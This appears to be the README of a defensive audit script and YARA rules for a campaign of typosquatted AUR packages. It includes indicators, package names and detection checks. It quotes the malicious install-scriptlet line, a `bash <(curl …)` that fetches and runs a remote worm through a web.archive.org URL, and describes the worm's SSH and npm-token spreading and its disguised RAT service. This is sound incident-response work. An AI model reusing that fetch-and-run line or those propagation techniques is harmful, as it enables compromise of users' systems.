# AUR typosquat audit — October 2026

A read-only host audit for the October 2026 Arch User Repository typosquat wave, plus the YARA
rules built from the recovered artifacts.

Nothing here executes malware. The script does not write, does not install anything, and does
not touch the network.

---

## What happened

Between 2026-09-29 and 2026-10-14, one toolchain was staged from a public Git forge and pushed
into two package ecosystems.

**AUR, 2026-10-13/14.** 29 typosquatted packages in two clusters:

- 15 impersonating `yay` — `ay ayy hay tay uay ya yaay yat yau yayy yqy ysy yya yyay yzy`
- 14 impersonating `brave-beta-bin` — `bravve-bravw-brqve-brrave-brsve-brvae-brve-brzve-btave-grave-nrave-rave-rbave-vrave` (all with the `-beta-bin` suffix)

Every one of the 29 shipped a **byte-identical 199-byte `.install`**:

```
4b46e7374d148e207d2a4b5d2931b16d0fdce83ece2e05823d211c07ac9eb75d
```

The scriptlet is two decoy functions that return `true`, plus one line at top level:

```bash
bash <(curl -L 'https://web.archive.org/web/<forge>/…/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

**The delivery wrapper is the interesting part.** The payload is fetched through
`web.archive.org`, wrapping the operator's own staging repo. The operator archived their own
malware and now serves it from the Internet Archive. Blocking the forge does not block delivery,
and blocking the Archive outright is not an acceptable control. Any detection has to match on the
embedded original URL.

The downloaded `linux.sh` is a self-propagating worm: it injects the same line into other AUR
packages, spreads through SSH `known_hosts`, abuses npm tokens, and installs a CHAOS RAT client
as a fake systemd font service (`systemd-fontd` / `systemd-fontrenderd`, "Font Rendering
Service") with a Tor `.onion` C2.

**The commit forgery.** Each repo copies the upstream package history (148 commits for the `yay`
cluster, 1,621 for `brave`), then adds one tip commit that sets the genuine maintainer as the
author and backdates the author date by months. The real committer is `hellscripter <>` in both
clusters. Anyone reading `git log` sees a legitimate name and a long history.

The packages were removed from the AUR index by Arch staff. **The git history remains cloneable
by name**, which is standard AUR behaviour for deleted packages, so the malicious `.install` is
still retrievable from `aur.archlinux.org` even though it is no longer installable through a
helper.

---

## What this script checks

Nine read-only checks, each reported as PASS / FAIL / SKIP:

| Check | What it looks at |
|---|---|
| a | pacman's installed scriptlet store (`/var/lib/pacman/local/*/install`) for the staging URL string and the carrier hash |
| b | whether any of the 29 typosquat package names is installed |
| c | systemd units and timers for `systemd-fontd`, `systemd-fontrenderd`, `fontrenderd`, or a unit described as "Font Rendering Service" |
| d | the implant on disk, by name and by SHA-256 |
| e | cron entries and timers referencing the staging URL or the font service |
| f | `known_hosts` and `authorized_keys` counts, mtimes and fingerprints for review (key material is never printed) |
| g | npm token configuration (`~/.npmrc`, `NPM_CONFIG_USERCONFIG`) — presence only, values never printed |
| h | local AUR build directories for the injected `bash <(curl …)` line |
| i | the staging URL string across `/etc`, the pacman DB, `~/.config`, `~/.npmrc` and shell history (counts only) |

## Usage

```bash
chmod +x arch_audit.sh
./arch_audit.sh                 # audits the current directory
./arch_audit.sh /var/www/html   # or point it at a WordPress/pacman root as needed
```

Exit codes: `0` clean within scope, `1` findings, `2` inconclusive (a check could not run).

Requires `bash`, and `pacman` for the package checks. Everything else degrades to SKIP. Some
checks read root-owned paths; run as root for full coverage, though most work unprivileged.

## What it cannot see

Stated plainly so nobody treats a clean result as a guarantee:

- other users' home directories (reported as skipped, not scanned)
- AUR build directories outside the common locations (`~/build`, `~/aur`, `~/.cache/yay`, …)
- a renamed copy of the implant outside the standard paths
- whether an npm token was actually abused — that needs provider audit logs
- **current AUR scriptlet contents at scale.** The AUR exposes no full-text search over
  `.install` files, so a sibling typo not on this list cannot be name-checked.

## Indicators

Payloads recovered and filed to abuse.ch:

| Artifact | Size | SHA-256 |
|---|---:|---|
| `linux.sh` (worm) | 7,312 B | `402781973739d057cf3e91d14fce1fb0c12ca95683e2ba43c035ae43314995dd` |
| `node.js` (stage-1 loader) | 503 B | `b4fdaf46a9817f828eb7bc29c9319953a9e06fba2bc2325c972bc25d4ed219d5` |
| `systemd-fontd` (CHAOS RAT, ELF x86-64) | 7,581,959 B | `4ab643f49ee2a86c36ba665d7a3e5b91997d1da2840d64a0483d2b477c7ca7e0` |
| `<pkg>.install` carrier | 199 B | `4b46e7374d148e207d2a4b5d2931b16d0fdce83ece2e05823d211c07ac9eb75d` |

Filed to ThreatFox under the `elf.chaos` family, and the samples to MalwareBazaar. Tags:
`aur`, `dirtyblanket`, `chaos`, `elf.chaos`, `wayback-staging`.

The C2 `.onion` is deliberately not published here. It is in the abuse.ch records if you need it.

## YARA

`aur_dirtyblanket.yar` contains six rules covering the worm, the stage-1 loader, the carrier
scriptlet, the Internet-Archive staging pattern, the AUR-injection line, and the CHAOS implant.
Compile with `yarac` and scan your package cache or a suspected host.

## Credit and scope

Static analysis only. No sample was executed. No C2 was contacted. The associated campaign and
this work are independent research; the tooling was identified from public artifact bytes, not
from any attribution claim.

MIT licensed. No warranty. If it breaks on your system, open an issue with the check letter and
the output line.
